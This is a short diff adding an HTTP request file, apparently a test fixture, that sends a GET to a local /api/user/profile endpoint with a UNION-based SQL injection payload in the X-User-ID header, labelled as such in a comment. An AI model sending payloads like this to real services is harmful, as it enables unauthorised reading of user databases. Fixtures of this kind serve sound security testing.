@@ -1,0 +1,6 @@
+GET /api/user/profile HTTP/1.1
+Host: localhost:8080
+X-User-ID: ' UNION SELECT * FROM users --
+Accept: application/json
+
+# SQL Injection Payload: ' UNION SELECT * FROM users --
